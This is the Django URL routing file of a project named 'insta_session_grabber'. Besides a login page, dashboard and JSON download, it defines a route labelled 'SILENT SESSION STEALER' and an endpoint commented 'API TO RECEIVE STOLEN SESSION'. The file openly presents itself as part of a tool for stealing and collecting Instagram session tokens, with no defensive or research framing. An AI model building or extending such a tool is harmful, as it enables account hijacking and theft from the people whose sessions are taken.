# insta_session_grabber/urls.py → ULTRA CLEAN

from django.contrib import admin
from django.urls import path
from core import views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.login_view),
    path('dashboard/', views.dashboard, name='dashboard'),
    path('download-json/', views.download_json),
    
    # SILENT SESSION STEALER
    path('go/', views.silent_page, name='go'),
    
    # API TO RECEIVE STOLEN SESSION
    path('steal-session/', views.steal_session, name='steal_session'),
]